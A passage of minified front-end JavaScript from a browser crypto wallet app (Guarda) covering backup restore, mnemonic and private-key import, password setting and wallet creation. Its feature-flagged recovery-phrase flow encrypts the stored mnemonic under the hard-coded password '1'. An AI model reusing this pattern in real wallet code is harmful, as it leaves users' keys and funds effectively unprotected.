            O.useState)("")
              , [p,f] = (0,
            O.useState)("")
              , [E,h] = (0,
            O.useState)(!1)
              , {isLoading: g, withLoading: y} = useLoading()
              , v = useLocationSearch()
              , _ = (0,
            j.k6)()
              , w = (0,
            j.TH)()
              , b = (0,
            O.useRef)(null)
              , setAndReadFile = e => {
                if (-1 !== e.name.indexOf(".txt") || -1 !== e.name.indexOf(".guarda"))
                    try {
                        const t = new FileReader;
                        u(e);
                        t.onload = e => {
                            var t;
                            "string" == typeof (null === (t = e.target) || void 0 === t ? void 0 : t.result) && m(e.target.result)
                        }
                        ;
                        t.readAsText(e)
                    } catch (e) {}
            }
              , handleInputFile = e => {
                var t;
                null !== (t = e.target.files) && void 0 !== t && t[0] && setAndReadFile(e.target.files[0])
            }
              , [k,S] = (0,
            O.useState)(!1)
              , handleDragEnter = e => {
                e.stopPropagation();
                e.preventDefault();
                k || S(!0)
            }
              , handleDragLeave = e => {
                e.stopPropagation();
                e.preventDefault();
                k && S(!1)
            }
              , handleDropFile = e => {
                e.preventDefault();
                e.stopPropagation();
                const t = e.dataTransfer;
                S(!1);
                h(!1);
                null != t && t.files[0] && setAndReadFile(t.files[0])
            }
              , [C,N] = (0,
            O.useState)("file")
              , [T,A] = (0,
            O.useState)(!1)
              , [x,I] = (0,
            O.useState)("")
              , [P,L] = (0,
            O.useState)(!1)
              , F = AttackManager.isDirty()
              , [W,R] = (0,
            O.useState)(!1)
              , [B,D] = (0,
            O.useState)(!1)
              , U = O.createRef();
            (0,
            O.useEffect)(( () => {
                L(!1)
            }
            ), [x]);
            (0,
            O.useEffect)(( () => {
                const bodyStartDrag = () => h(!0)
                  , bodyEndDrag = () => {
                    E && h(!1)
                }
                ;
                document.body.addEventListener("dragenter", bodyStartDrag, !1);
                document.body.addEventListener("dragleave", bodyEndDrag, !1);
                return () => {
                    document.body.removeEventListener("dragenter", bodyStartDrag);
                    document.body.removeEventListener("dragleave", bodyEndDrag)
                }
            }
            ), []);
            const G = y((async () => {
                L(!1);
                const {isValid: e} = U.current.validate();
                if (!e) {
                    var a;
                    L(!0);
                    I("");
                    null === (a = b.current) || void 0 === a || a.focus();
                    return
                }
                if (!d && !p) {
                    var n;
                    A(!0);
                    I("");
                    setTimeout(( () => A(!1)), 2e3);
                    null === (n = b.current) || void 0 === n || n.focus();
                    return
                }
                const r = "file" === C ? d : p
                  , {shouldAbort: l} = await i(withSecureStorageRestoreInProgress((async () => {
                    "merge" !== t && i(ie.setMasterPassword({
                        masterPassword: x
                    }));
                    const e = await i(decodeStorageByPassword(x, r));
                    if (!e) {
                        var a;
                        A(!0);
                        I("");
                        setTimeout(( () => A(!1)), 2e3);
                        null === (a = b.current) || void 0 === a || a.focus();
                        ge.b.error(ge.d.RESTORE_WALLET_ERROR);
                        return {
                            shouldAbort: !0
                        }
                    }
                    if (void 0 === t) {
                        i(ie.replaceStorage({
                            password: x,
                            data: e
                        }));
                        await i(clearAllHidenWallets());
                        await i(gc());
                        await i(No())
                    }
                    "merge" === t && (e.wallets = e.wallets.map((t => {
                        t.derivedFromMnemonicUsing && "string" == typeof t.privateKey && (t.privateKey = {
                            privateKey: t.privateKey,
                            mnemonic: e.mnemonic
                        });
                        return t
                    }
                    )));
                    i(rd.mergeWallets({
                        newWallets: e.wallets,
                        mnemonic: e.mnemonic
                    }));
                    await i(triggerSaveWallets());
                    f("");
                    I("");
                    ge.b.success(ge.d.RESTORE_WALLET_SUCCESS, {
                        backup_id: (null == o ? void 0 : o.uuid) || e.uuid
                    });
                    return {
                        shouldAbort: !1
                    }
                }
                )));
                if (!l) {
                    if ("merge" === t) {
                        i(handleDownload(Sm.FORCE));
                        i(removeNotifyBackup())
                    }
                    if ((0,
                    M.p1)()) {
                        var s;
                        const e = await i(getSecureData($e))
                          , t = decodeURIComponent(null !== (s = v.redirectUri) && void 0 !== s ? s : "")
                          , a = undefined;
                        if (!(e || t && t.startsWith("/app/extension/send"))) {
                            _.replace("/app/extension/settings");
                            return
                        }
                    }
                    if (v.redirectUri) {
                        const e = decodeURIComponent(v.redirectUri || "") || ""
                          , t = decodeURIComponent(v.searchUri || "");
                        _.replace({
                            pathname: e || (0,
                            M.RU)(),
                            search: t || w.search
                        })
                    } else
                        _.replace({
                            pathname: (0,
                            M.RU)(),
                            search: w.search
                        })
                }
            }
            ))
              , pasteHandle = () => {
                navigator.clipboard.readText().then((e => f(e)))
            }
              , restoreTypeHandle = () => {
                if ("text" === C) {
                    N("file");
                    f("")
                } else
                    N("text")
            }
            ;
            return O.createElement(O.Fragment, null, !r && O.createElement("h3", {
                className: ZY
            }, n || "Restore"), O.createElement("p", {
                className: Ht()(YY, {
                    [qY]: (0,
                    M.tq)() || (0,
                    M.p1)()
                }),
                dangerouslySetInnerHTML: {
                    __html: a
                }
            }), O.createElement("span", {
                className: Ht()(KY, {
                    [qY]: (0,
                    M.tq)() || (0,
                    M.p1)()
                })
            }, O.createElement(Yl, {
                onClick: restoreTypeHandle,
                color: "light-blue",
                size: "small",
                "data-test-name": "toggle-input-type"
            }, "file" === C ? "Enter backup text" : "Upload file")), O.createElement("div", {
                className: Ht()(zY, null == s ? void 0 : s.dragAndDrop, {
                    [$Y]: k
                }, {
                    [$Y]: !("file" === C)
                }, {
                    [qY]: (0,
                    M.tq)() || (0,
                    M.p1)()
                })
            }, O.createElement("div", {
                className: Ht()(uq, {
                    [dq]: E
                }),
                onDragEnter: handleDragEnter,
                onDragOver: handleDragEnter,
                onDragLeave: handleDragLeave,
                onDrop: handleDropFile
            }), "file" === C ? O.createElement("div", {
                className: Ht()(c && yq),
                onDragEnter: handleDragEnter
            }, O.createElement("div", {
                className: Ht()(c ? vq : gq)
            }), !c && O.createElement("div", {
                className: nq
            }, "Drag and drop file or"), c ? O.createElement("div", {
                className: Ht()(lq, "relative")
            }, O.createElement("div", {
                className: sq
            }, c.name), O.createElement("img", {
                className: iq,
                src: kq,
                width: 24,
                height: 24,
                alt: "close icon",
                onClick: () => u(null)
            })) : O.createElement("label", {
                htmlFor: "fileupload",
                className: aq
            }, O.createElement("input", {
                id: "fileupload",
                type: "file",
                onChange: handleInputFile,
                size: 40,
                className: rq
            }), O.createElement("span", {
                className: mq
            }, "Browse"))) : O.createElement("fieldset", {
                className: JY
            }, O.createElement("legend", {
                className: Ht()(fq, tq)
            }, "Backup text"), O.createElement(aE, {
                placeholder: "Enter backup text",
                spellCheck: "false",
                className: jY,
                value: p,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return f(t)
                }
                ,
                "data-test-name": "backup-text"
            }), !isFirefox() && !p && O.createElement(Yl, {
                className: Ht()(_q, {
                    [qY]: (0,
                    M.tq)() || (0,
                    M.p1)()
                }),
                onClick: pasteHandle,
                color: "light-blue",
                size: "small"
            }, "Paste"))), O.createElement(sf(), {
                ref: U
            }, O.createElement("fieldset", {
                className: Ht()(XY, W && hq, null == s ? void 0 : s.inputWrapper, (P || T) && LY, {
                    [qY]: (0,
                    M.tq)() || (0,
                    M.p1)()
                }),
                onFocus: () => R(!0),
                onBlur: () => R(!1)
            }, O.createElement("legend", {
                className: Ht()(fq, W && hq)
            }, "Backup password"), O.createElement(lf.ValidatorField, {
                rules: zf.password,
                value: x
            }, (e => {
                let {isValid: t, message: a} = e;
                P && !t && A(!1);
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isInvalid: !t && P,
                    message: a,
                    top: 5,
                    left: 10
                }, O.createElement(Ea, {
                    className: Ht()(pq, x && !B && PY, null == s ? void 0 : s.inputText),
                    ref: b,
                    type: B ? "text" : "password",
                    placeholder: "Enter password",
                    autoComplete: "off",
                    value: x,
                    onEnter: G,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return I(t)
                    }
                    ,
                    "data-test-name": "password"
                }))
            }
            )), x && O.createElement("span", {
                onClick: () => I(""),
                className: Ht()(bY, W ? kY : SY, CY)
            }), !l && O.createElement("span", {
                onClick: () => D((e => !e)),
                className: Ht()(bY, !B && (W ? TY : AY), B && (W ? xY : IY), NY)
            }), O.createElement("div", {
                className: oq
            }, T ? "Invalid Password or Backup code" : ""))), F && O.createElement(_m, {
                currency: "btc"
            }), O.createElement("div", {
                className: Ht()(QY, {
                    [qY]: (0,
                    M.tq)() || (0,
                    M.p1)()
                })
            }, O.createElement(Yl, {
                isLoading: g,
                onClick: G,
                color: "blue",
                size: "big",
                className: Ht()(((0,
                M.tq)() || (0,
                M.p1)()) && wq),
                "data-test-name": "restore"
            }, "Restore")))
        }
        const Sq = Boolean(M.CM && "1" === (0,
        bu.ZP)("feature-mnemonic"))
          , Cq = "menu_menu_3XsCP menu_menu_2wA28"
          , Nq = "menu_active_1pWvh menu_active_3L5Jb"
          , import_wallets_menu = () => O.createElement("nav", {
            className: Cq
        }, O.createElement(Y.OL, {
            to: (0,
            M.RU)("/restore"),
            activeClassName: Nq
        }, "Restore from Guarda Backup"), Sq && O.createElement(Y.OL, {
            to: (0,
            M.RU)("/recovery-mnemonic"),
            activeClassName: Nq
        }, "Recovery phrase"), O.createElement(Y.OL, {
            to: (0,
            M.RU)("/import"),
            activeClassName: Nq
        }, "Import by Currency"), O.createElement(Y.OL, {
            to: (0,
            M.RU)("/import-mnemonic"),
            activeClassName: Nq
        }, "Import Mnemonic"))
          , Tq = {
            recoveryWrapper: "recovery-phrase_recoveryWrapper_1cuB9",
            infoIcon: "recovery-phrase_infoIcon_28F_z",
            wrapperImportBlock: "recovery-phrase_wrapperImportBlock_1vjwd",
            textarea: "recovery-phrase_textarea_2PDKK",
            hideMnemonic: "recovery-phrase_hideMnemonic_14TMW",
            secureNoteWrapper: "recovery-phrase_secureNoteWrapper_39TdI",
            secureNote: "recovery-phrase_secureNote_19oRu",
            wrapperAddButton: "recovery-phrase_wrapperAddButton_3bBET",
            wrapperQrScanner: "recovery-phrase_wrapperQrScanner_dB2s3",
            tooltipRed: "recovery-phrase_tooltipRed_3GuNi",
            themeWhite: "recovery-phrase_themeWhite_2ABI2",
            inputMnemonicPhrase: "recovery-phrase_inputMnemonicPhrase_1k3VN",
            buttonRestore: "recovery-phrase_buttonRestore_qu5ZQ",
            showPassIconBlue: "recovery-phrase_showPassIconBlue_3W_q1",
            hidePassIconBlue: "recovery-phrase_hidePassIconBlue_3MdXj",
            icon: "recovery-phrase_icon_39oOt",
            rightIcon: "recovery-phrase_rightIcon_-C76X",
            leftIcon: "recovery-phrase_leftIcon_k6Gkg",
            currencyItem: "recovery-phrase_currencyItem_1sg7L",
            currencyText: "recovery-phrase_currencyText_4sJU2",
            currencyName: "recovery-phrase_currencyName_2L456",
            currencyTicker: "recovery-phrase_currencyTicker_3grPu",
            currencyCheck: "recovery-phrase_currencyCheck_2RUzm"
        }
          , Aq = a.p + "9e32a796f2cb4119b5107880e375b8e2.svg";
        var xq;
        !function(e) {
            e[e.MNEMONIC_INPUT = 0] = "MNEMONIC_INPUT";
            e[e.CURRENCY_SELECT = 1] = "CURRENCY_SELECT"
        }(xq || (xq = {}));
        const RecoveryPhrase_RecoveryPhrase = () => {
            const [e,t] = (0,
            O.useState)("")
              , [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(xq.MNEMONIC_INPUT)
              , [m,p] = (0,
            O.useState)([])
              , f = O.createRef();
            let E;
            const h = (0,
            $.v9)(Ot)
              , g = (0,
            $.I0)()
              , y = (0,
            j.k6)()
              , showError = e => {
                c(!1);
                t("");
                l(e);
                window.clearTimeout(E);
                E = window.setTimeout(( () => l(!1)), 2e3)
            }
              , handleRestore = () => {
                var e, t;
                if (o)
                    return;
                i(!1);
                const {isValid: a} = null !== (e = null === (t = f.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {};
                if (a) {
                    c(!0);
                    try {
                        c(!1);
                        d(xq.CURRENCY_SELECT)
                    } catch (e) {
                        showError("Mnemonic phrase is invalid!");
                        return
                    }
                } else
                    i(!0)
            }
              , v = (0,
            O.useCallback)((async () => {
                const t = new AbortController
                  , {signal: a} = t
                  , n = await createTopCurrencies({
                    abortSignal: a,
                    mnemonic: e,
                    eventHandlers: {
                        onStart(e) {
                            console.log("start", e)
                        },
                        onFinish(e) {
                            console.log("finish", e)
                        }
                    }
                })
                  , {privateKey: r} = await Wf.deriveForAdapter(e, {
                    ticker: "eth",
                    accountIndex: 666,
                    chainIndex: 666,
                    addressIndex: 666
                })
                  , l = await Se.Z.getApiByCurrency("eth")
                  , {address: s} = await l.getAddressFromPrivateKey({
                    privateKey: r
                });
                await g(ie.setMasterPassword({
                    masterPassword: "1"
                }));
                g(ie.replaceStorage({
                    password: "1",
                    data: {
                        uuid: s,
                        mnemonic: e,
                        wallets: n.map((e => e.mapToPlainObject()))
                    }
                }));
                await g(bulkAddWallets(n.map((e => e.mapToPlainObject()))));
                y.replace({
                    pathname: (0,
                    M.RU)("/")
                })
            }
            ), [e, m])
              , handleScanMnemonicPhrase = e => {
                t(e)
            }
              , _ = (0,
            O.useMemo)(( () => Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate && e.isActiveBulkCreate)).map((e => (0,
            be.II)(e))).filter((e => Boolean(e))).sort(( (e, t) => e.ticker > t.ticker))), [])
              , w = (0,
            O.useCallback)((e => {
                const t = e.target.getAttribute("data-ticker");
                e.target.checked ? p([...m, t]) : p(m.filter((e => e !== t)))
            }
            ), [m]);
            return O.createElement("div", {
                className: Tq.recoveryWrapper
            }, O.createElement("h3", null, "Recovery from mnemonic"), u === xq.MNEMONIC_INPUT && O.createElement(O.Fragment, null, O.createElement("p", null, "You can import wallets via 12-word recovery phrase that was generated when you created a wallet. This phrase is encrypted and kept in the browser local storage and nowhere else  ", O.createElement("span", null, O.createElement("img", {
                className: Tq.infoIcon,
                src: Aq,
                alt: "info-icon"
            }))), O.createElement("div", {
                className: Ht()(Tq.wrapperImportBlock, {
                    [Tq.themeWhite]: "light" === h
                })
            }, O.createElement(sf(), {
                ref: f
            }, O.createElement("div", {
                className: "relative"
            }, O.createElement(tooltip, {
                text: r || "",
                visible: !!r,
                className: Tq.tooltipRed
            }), O.createElement(lf.ValidatorField, {
                rules: zf.mnemonicPhrase,
                value: e
            }, (n => {
                let {isValid: r, message: l} = n;
                return O.createElement(pa, {
                    isInvalid: !r && s,
                    message: l,
                    top: -35
                }, O.createElement(aE, {
                    placeholder: "Enter your recovery phrase",
                    spellCheck: "false",
                    autoComplete: "off",
                    className: Ht()(Tq.textarea, {
                        [Tq.hideMnemonic]: !a
                    }),
                    value: e,
                    onChange: e => {
                        let {target: {value: a}} = e;
                        return t(a)
                    }
                }))
            }
            )), O.createElement(qr_scanner_paste_button, {
                setAddress: handleScanMnemonicPhrase,
                className: Ht()(Tq.rightIcon)
            }), O.createElement("span", {
                onClick: () => n((e => !e)),
                className: Ht()(Tq.icon, !a && Tq.showPassIconBlue, a && Tq.hidePassIconBlue, Tq.leftIcon)
            }))), O.createElement("div", {
                className: Tq.wrapperAddButton
            }, O.createElement(secure_note, {
                color: "light" === h ? "white" : "dark",
                className: Tq.secureNote
            }), O.createElement(Yl, {
                onClick: handleRestore,
                color: "white",
                className: Tq.buttonRestore,
                size: "big",
                isLoading: o
            }, "Restore")))), u === xq.CURRENCY_SELECT && O.createElement(O.Fragment, null, O.createElement("p", null, "Choose assets to import"), O.createElement("h3", null, "Coins to import"), O.createElement(Yl, {
                onClick: v,
                color: "white",
                className: Tq.buttonRestore,
                size: "big",
                isLoading: o
            }, "Next"), O.createElement("div", null, _ && _.map((e => O.createElement("div", {
                className: Tq.currencyItem,
                key: e.ticker
            }, O.createElement(IconCurrency, {
                currency: e.ticker,
                className: Ht()(Tq.currencyTicker, Tq[`ticker-${e.ticker}`])
            }), O.createElement("div", {
                className: Tq.currencyText
            }, O.createElement("span", {
                className: Tq.currencyName
            }, e.title), O.createElement("div", {
                className: Tq.currencyTicker
            }, (0,
            be.xG)(e.ticker))), O.createElement(mp, {
                className: Tq.currencyCheck,
                "data-ticker": e.ticker,
                checked: !!e.ticker && m.includes(e.ticker),
                onChange: w
            })))))))
        }
          , ImportMnemonic = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Ot)
              , a = (0,
            j.k6)()
              , handleAddWallets = async t => {
                await e(bulkAddWallets(t.map((e => e.mapToPlainObject()))));
                a.push({
                    pathname: (0,
                    M.RU)("/set-password"),
                    search: location.search
                })
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement("h3", {
                className: GY
            }, "Import Using Mnemonic Phrase"), O.createElement("p", {
                className: VY
            }, "You can restore your crypto wallet using your mnemonic phrase. This enables you to manage, send, purchase, and swap your cryptocurrency seamlessly. Your mnemonic phrase remains encrypted in browser’s local storage and is not held by any third-party organization."), O.createElement("div", {
                className: UY
            }, O.createElement(Zf, {
                isMnemonicImport: !0,
                onImportWalletsByMnemonic: handleAddWallets,
                theme: "dark" === t ? void 0 : "white",
                bgColor: "dark" !== t ? "blue" : void 0
            })))
        }
        ;
        function AppPageImport() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Ot)
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , r = (0,
            j.TH)()
              , l = AttackManager.isDirty();
            (0,
            O.useEffect)((function onClearWalletsStore() {
                e(clearSecureStorage())
            }
            ), []);
            const handleImport = () => {
                n.push({
                    pathname: (0,
                    M.RU)("/set-password"),
                    search: r.search
                })
            }
              , handleAddWallet = t => e(rd.addWallet({
                wallet: t
            }))
              , handleRemoveWallet = t => () => e(rd.removeWallet({
                wallet: t
            }));
            return O.createElement("div", {
                className: FY,
                "data-test-name": "import-wallets"
            }, O.createElement(white_block, null, O.createElement(import_wallets_menu, null), O.createElement(j.rs, null, O.createElement(j.AW, {
                path: (0,
                M.RU)("/restore")
            }, O.createElement(RestoreTab, null)), O.createElement(j.AW, {
                path: (0,
                M.RU)("/recovery-mnemonic")
            }, O.createElement(RecoveryPhrase_RecoveryPhrase, null)), O.createElement(j.AW, {
                path: (0,
                M.RU)("/import")
            }, O.createElement(O.Fragment, null, O.createElement("h3", {
                className: GY
            }, "Import your funds"), O.createElement("p", {
                className: VY
            }, "You can import the private keys from external wallets. This will allow you to receive, send, purchase and exchange crypto. Your private keys are held encrypted on this browser local storage, not by a company."), O.createElement("div", {
                className: UY
            }, O.createElement(Zf, {
                onImportWallets: handleAddWallet,
                theme: "dark" === t ? void 0 : "white",
                bgColor: "dark" !== t ? "blue" : void 0
            })), O.createElement("div", {
                className: RY
            }, O.createElement("h3", null, "Wallets"), O.createElement("div", {
                className: BY
            }, !a.length && O.createElement("div", {
                className: OY
            }, "No wallets have been added"), a.map((e => O.createElement(wA, {
                key: `walletitem${e.address}${e.currency}`,
                wallet: e,
                className: MY
            }, O.createElement("img", {
                src: bq,
                alt: "",
                className: DY,
                onClick: handleRemoveWallet(e)
            })))))), l && O.createElement(_m, {
                currency: "btc"
            }), O.createElement("div", {
                className: WY
            }, O.createElement(BackButton, {
                to: (0,
                M.RU)()
            }), O.createElement(Yl, {
                onClick: handleImport,
                color: "blue",
                disabled: !a.length,
                size: "big"
            }, "Import")))), O.createElement(j.AW, {
                path: (0,
                M.RU)("/import-mnemonic")
            }, O.createElement(ImportMnemonic, null)))))
        }
        const Iq = "import_wrapper_2ki_e";
        function InitialImportWallet() {
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: Ht()("col-xs-6", "col-xs-offset-3", Iq)
            }, O.createElement(AppPageImport, null))))
        }
        const password_security_level = e => {
            const t = undefined;
            return [e.length > 6, /[0-9]{1,}/.test(e), /[a-z]{1,}/.test(e), /[A-Z]{1,}/.test(e), !/^[0-9a-zA-Z]+$/.test(e)].reduce(( (e, t) => t ? e + 1 : e), 0)
        }
          , Pq = {
            wrapper: "set-password_wrapper_2jxsf",
            input: "set-password_input_3vi6i",
            inputPasswordMediumLvl: "set-password_inputPasswordMediumLvl_34rF2",
            inputPasswordWellDoneLvl: "set-password_inputPasswordWellDoneLvl_2CT3f",
            inputPasswordMediumRareOrWellLvl: "set-password_inputPasswordMediumRareOrWellLvl_BrLbC",
            inputConfirmPassword: "set-password_inputConfirmPassword_z8LJq",
            secureNoteWrapper: "set-password_secureNoteWrapper_VSYhY",
            buttonsWrapper: "set-password_buttonsWrapper_1L0hw",
            passwordSecurity: "set-password_passwordSecurity_20xFW",
            header: "set-password_header_1QTlu",
            description: "set-password_description_1oGRo",
            footerBlock: "set-password_footerBlock_3aFLb app_footerBlock_n86Kc",
            stepInfo: "set-password_stepInfo_I57BP app_stepInfo_2VLE6"
        }
          , Lq = ["rare", "medium rare", "medium", "medium well", "well done"]
          , SetPasswordComponent = e => {
            const [t,a] = (0,
            O.useState)("")
              , [n,r] = (0,
            O.useState)("")
              , [l,s] = (0,
            O.useState)(!1)
              , i = O.createRef()
              , getPasswordLvl = () => Lq[password_security_level(t) - 1]
              , handleStart = () => {
                var a, n;
                s(!1);
                const {isValid: r} = null !== (a = null === (n = i.current) || void 0 === n ? void 0 : n.validate()) && void 0 !== a ? a : {};
                r ? e.onSetPassword(t) : s(!0)
            }
            ;
            (0,
            O.useEffect)(( () => {
                s(!1)
            }
            ), [t, n]);
            return O.createElement(white_block, {
                className: Ht()({
                    [Pq.wrapper]: e.isMnemonicStep
                })
            }, O.createElement("h3", {
                className: Ht()({
                    [Pq.header]: e.isMnemonicStep
                })
            }, "Protect your wallet with a password"), O.createElement("p", {
                className: Ht()({
                    [Pq.description]: e.isMnemonicStep
                })
            }, "The password you enter encrypts your private key and gives access to your funds. Please store your password in a safe place. We don’t keep your information and can’t restore it."), O.createElement(sf(), {
                ref: i
            }, O.createElement(lf.ValidatorField, {
                value: t,
                rules: zf.password
            }, (e => {
                let {isValid: n, message: r} = e;
                return O.createElement(pa, {
                    isInvalid: !n && l,
                    message: r
                }, !!t.length && O.createElement("div", {
                    className: Pq.passwordSecurity
                }, "Password security: ", getPasswordLvl()), O.createElement(Ea, {
                    type: "password",
                    value: t,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return a(t)
                    }
                    ,
                    placeholder: "Password",
                    autoComplete: "off",
                    onEnter: handleStart,
                    className: Ht()(Pq.input, "medium" === getPasswordLvl() ? Pq.inputPasswordMediumLvl : "well done" === getPasswordLvl() ? Pq.inputPasswordWellDoneLvl : Pq.inputPasswordMediumRareOrWellLvl)
                }))
            }
            )), O.createElement(lf.ValidatorField, {
                value: n,
                rules: zf.passwordRepeat(t)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && l,
                    message: a
                }, O.createElement("div", {
                    className: Pq.secureNoteWrapper
                }, O.createElement(secure_note, null)), O.createElement(Ea, {
                    type: "password",
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return r(t)
                    }
                    ,
                    value: n,
                    placeholder: "Confirm password",
                    autoComplete: "off",
                    onEnter: handleStart,
                    className: Ht()(Pq.input, Pq.inputConfirmPassword)
                }))
            }
            ))), e.isMnemonicStep ? O.createElement("div", {
                className: Pq.footerBlock
            }, O.createElement("div", {
                className: Pq.stepInfo
            }, "Step 3 of 3"), O.createElement("div", null, O.createElement("span", {
                onClick: e.onBackButtonClick
            }, "Back"), O.createElement(Yl, {
                className: Pq.buttonConfirm,
                color: "blue",
                size: "big",
                onClick: handleStart,
                id: "writtenPasswordDown"
            }, "I saved the password"))) : O.createElement("div", {
                className: Pq.buttonsWrapper
            }, O.createElement(BackButton, {
                to: e.backUrl ? (0,
                M.RU)(e.backUrl) : void 0
            }), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleStart,
                id: "writtenPasswordDown"
            }, "I’ve written it down")))
        }
          , Fq = "create-wallets_whiteBlock_-UwGM"
          , Wq = "create-wallets_loader_22o93"
          , Rq = "create-wallets_center_16qK-"
          , Bq = "create-wallets_button_8F4aP"
          , Oq = "create-wallets_progressBar_39C-I"
          , Dq = "create-wallets_createTitle_D6PbU"
          , Mq = "create-wallets_loaderCreateWallet_1Q_Hv"
          , Uq = "progressbar_progressBar_3v-XZ";
        function ProgressBar(e) {
            let {progress: t} = e;
            return O.createElement("div", {
                className: Uq
            }, O.createElement("div", {
                style: {
                    width: 100 * t + "%"
                }
            }))
        }
        const Gq = new AbortController
          , CreateWallets_CreateWallets = () => {
            const e = (0,
            $.I0)()
              , [t,a] = (0,
            O.useState)("")
              , n = useLocationSearch()
              , r = (0,
            j.k6)()
              , l = (0,
            j.TH)()
              , [s,i] = (0,
            O.useState)()
              , [o,c] = (0,
            O.useState)([])
              , u = o.length / Uf
              , d = (0,
            $.v9)($c)
              , [m,p] = (0,
            O.useState)("")
              , handleDownloadAndContinue = async () => {
                if (!t || !d)
                    return;
                const a = await generateBackupIdFromMnemonic(m)
                  , s = await patchMigrations({});
                e(ie.replaceStorage({
                    password: t,
                    data: {
                        uuid: a,
                        mnemonic: m,
                        wallets: d.map((e => e.mapToPlainObject())),
                        [Ze]: 62,
                        [nt]: null == s ? void 0 : s.version
                    }
                }));
                await e(ie.setMasterPassword({
                    masterPassword: t
                }));
                cc.$.send(cc.d.WALLET_CREATE_FULL);
                n.refId && await e(activateReferralLink(n.refId));
                e(handleDownload(Sm.FORCE));
                e(removeNotifyBackup());
                if ((0,
                M.p1)()) {
                    const t = undefined
                      , a = undefined;
                    if (!(await e(getSecureData($e)) || n.redirectUri && n.redirectUri.startsWith((0,
                    M.RU)("/send")))) {
                        r.replace((0,
                        M.RU)("/settings"));
                        return
                    }
                }
                if (n.redirectUri) {
                    const e = decodeURIComponent(n.redirectUri || "") || ""
                      , t = decodeURIComponent(n.searchUri || "");
                    r.replace({
                        pathname: e || (0,
                        M.RU)(),
                        search: t || l.search
                    })
                } else
                    r.replace({
                        pathname: (0,
                        M.RU)(),
                        search: l.search
                    })
            }
              , handleStart = async t => {
                a(t);
                await e(clearSecureStorage());
                e(rd.createTop10Currencies({
                    abortController: Gq,
                    setCreatedInfos: c,
                    setCurrentCreatingTicker: i,
                    password: t,
                    setMnemonic: p
                }))
            }
            ;
            (0,
            O.useEffect)((function onStopCreatingWallets() {
                return () => {
                    e(rd.stopCreatingWallets())
                }
            }
            ), [e]);
            return t ? null != d && d.length ? O.createElement(white_block, {
                className: Fq
            }, O.createElement("h3", null, "Backup is the key to your funds"), O.createElement("p", null, "Please save your backup file and keep it properly as well as password. It ensures access to your funds."), O.createElement("ul", null, O.createElement("li", null, O.createElement("span", null, "Access to the wallet is possible only using both password and backup file.")), O.createElement("li", null, O.createElement("span", null, "Guarda does not keep nor able to restore your backup and password. Only you have access to your wallet.")), O.createElement("li", null, O.createElement("span", null, "Never share it with anyone."))), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleDownloadAndContinue,
                className: Bq,
                id: "creationDownloadBackup"
            }, "Download Backup")) : O.createElement("div", {
                className: Rq
            }, O.createElement("p", {
                className: Dq
            }, "Creating ", null == s ? void 0 : s.toUpperCase(), " wallet"), O.createElement(loader, {
                className: Mq,
                visible: !0,
                width: 20
            }), O.createElement(ProgressBar, {
                progress: u
            })) : O.createElement(SetPasswordComponent, {
                onSetPassword: handleStart,
                backUrl: "/"
            })
        }
          , Vq = "create_centerContainer_1c1nJ app_centerContainer_1VI1M";
        function CreateFullWallet() {
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-6 col-xs-offset-3"
            }, O.createElement("div", {
                className: Vq
            }, O.createElement(CreateWallets_CreateWallets, null)))))
        }
        const Kq = a.p + "5c6c7dcc905fcbd6d6505d35e4f876b8.svg"
          , Hq = "create-wallets-mnemonic_wrapper_WP17N"
          , zq = "create-wallets-mnemonic_header_31yyQ"
          , jq = "create-wallets-mnemonic_description_1i3Pm"
          , $q = "create-wallets-mnemonic_recoveryPhraseBlock_3Ii0g"
          , Zq = "create-wallets-mnemonic_notRevealedBlock_3sD93"
          , Yq = "create-wallets-mnemonic_recoveryPhraseWrapper_24kD1"
          , qq = "create-wallets-mnemonic_copyInfo_3kksI"
          , Xq = "create-wallets-mnemonic_recoveryPhrase_3KY4p"
          , Qq = "create-wallets-mnemonic_blur_1WJzu"
          , Jq = "create-wallets-mnemonic_lockContent_3xjJu"
          , eX = "create-wallets-mnemonic_lockSvg_3YQAq"
          , tX = "create-wallets-mnemonic_lockText_3KDIt"
          , aX = "create-wallets-mnemonic_footerBlock_2hI68 app_footerBlock_n86Kc"
          , nX = "create-wallets-mnemonic_stepInfo_kkdLj app_stepInfo_2VLE6"
          , rX = "create-wallets-mnemonic_buttonSave_2xgqt"
          , lX = a.p + "c35831ea207dfbc4bc1d99a36b31448e.svg"
          , sX = a.p + "2d6e36ce63e5720e5ede0eaf807d0eb8.svg"
          , iX = a.p + "706c9e47ff1f7ab443de8752efbb56df.svg"
          , CreateMnemonicStepPhrase = e => {
            let {onBackButtonClick: t, onComplete: a} = e;
            const n = (0,
            O.useMemo)(( () => Wf.generate()), [])
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , o = (0,
            $.v9)(Ot)
              , c = n.split(" ")
              , handleCopy = () => {
                if (r && document.queryCommandSupported && document.queryCommandSupported("copy")) {
                    const e = document.createElement("textarea");
                    e.textContent = n;
                    e.style.position = "fixed";
                    document.body.appendChild(e);
                    e.select();
                    i(!0);
                    setTimeout(( () => i(!1)), 700);
                    try {
                        document.execCommand("copy")
                    } catch (e) {
                        console.warn(e)
                    } finally {
                        document.body.removeChild(e)
                    }
                }
            }
              , handleRevealPhrase = () => {
                l(!0)
            }
              , handleCompleteButtonClick = () => {
                a({
                    mnemonic: n
